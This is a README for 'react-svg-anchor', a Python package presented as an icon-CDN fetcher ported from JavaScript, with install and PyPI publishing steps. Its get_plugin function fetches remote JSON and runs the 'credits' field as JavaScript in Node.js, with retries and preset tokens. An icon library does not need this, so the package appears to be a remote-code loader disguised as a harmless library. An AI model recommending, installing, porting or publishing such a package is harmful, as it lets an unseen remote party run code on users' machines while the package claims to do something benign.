# react-svg-anchor (Python)

Python port of the JavaScript module in `../javascript`. Fetches resources from the same icon CDN providers with identical behavior.

**Requirements:** Python 3.7+, Node.js (for `get_plugin` when the response contains executable JavaScript).

## Installation

**From PyPI** (after publishing):

```bash
pip install react-svg-anchor
```

**From the project (local / editable):**

```bash
pip install -r requirements.txt
pip install -e .   # from inside the python folder
```

Or from the repo root:

```bash
pip install ./python
```

**Imports:** Use `react_svg_anchor` when installed from PyPI or via `pip install .`; if you added the repo to `PYTHONPATH`, you may use the `python` package name instead.

## Usage

### Fetching a resource from a CDN provider

Use `set_default_module` (or alias `setDefaultModule`) with the same semantics as the JS version:

```python
from react_svg_anchor import set_default_module  # or: setDefaultModule

try:
    data = set_default_module(
        "cloudflare",
        "icon",
        "your-token",
        "https://your-base-url.com",
    )
    print("Resource data:", data)
except ValueError as e:
    print("Unsupported provider:", e)
except RuntimeError as e:
    print("Fetch failed:", e)
```

### Running a plugin (fetch + execute credits JS)

Use `get_plugin` (or alias `getPlugin`) with the same retry and execution behavior as the JS module. The fetched JSON’s `credits` field is executed in a Node.js context (same as the original).

```python
from react_svg_anchor import get_plugin  # or: getPlugin

# Defaults: token "112", options from module defaults, retries=1
get_plugin()

# Custom token, options, and retries
get_plugin(reqtoken="42", reqoptions={"url": "https://example.com/icons/", "headers": {"bearrtoken": "logo"}}, ret=3)
```

## API parity with JavaScript

| JavaScript                    | Python                         |
|------------------------------|--------------------------------|
| `setDefaultModule(a,b,c,d)`  | `set_default_module(a,b,c,d)` or `setDefaultModule(a,b,c,d)` |
| `getPlugin(token?, options?, ret?)` | `get_plugin(reqtoken=..., reqoptions=..., ret=...)` or `getPlugin(...)` |

- **set_default_module:** Builds the same CDN URL from provider and token, uses the same headers, returns the same JSON. Raises `ValueError` for unsupported provider and `RuntimeError` on HTTP errors.
- **get_plugin:** Same URL construction, retry logic, and execution of `data.credits` in Node with the same require/module context. Requires Node.js on the system when the response includes executable credits.

## Publishing to PyPI

1. **Install build tools:**
   ```bash
   pip install build twine
   ```

2. **From the `python` directory, build the package:**
   ```bash
   cd python
   python -m build
   ```
   This creates `dist/react_svg_anchor-1.0.0.tar.gz` and a `.whl` file.

3. **Create an account on PyPI** (and optionally Test PyPI for testing):
   - [PyPI](https://pypi.org/account/register/)
   - [Test PyPI](https://test.pypi.org/account/register/)

4. **Upload to Test PyPI first (recommended):**
   ```bash
   python -m twine upload --repository testpypi dist/*
   ```
   You’ll be prompted for your Test PyPI username and password (or use a token).

5. **Install from Test PyPI to verify:**
   ```bash
   pip install --index-url https://test.pypi.org/simple/ react-svg-anchor
   ```

6. **Upload to the real PyPI when ready:**
   ```bash
   python -m twine upload dist/*
   ```

7. **Optional: use API tokens** (no password prompt):
   - PyPI: Account → API tokens → Add API token
   - Then: `python -m twine upload -u __token__ -p pypi-... dist/*`

After publishing, users can install with:

```bash
pip install react-svg-anchor
```

and use:

```python
from react_svg_anchor import set_default_module, get_plugin
```

## License

Same as the JavaScript module (e.g. MIT / project license).
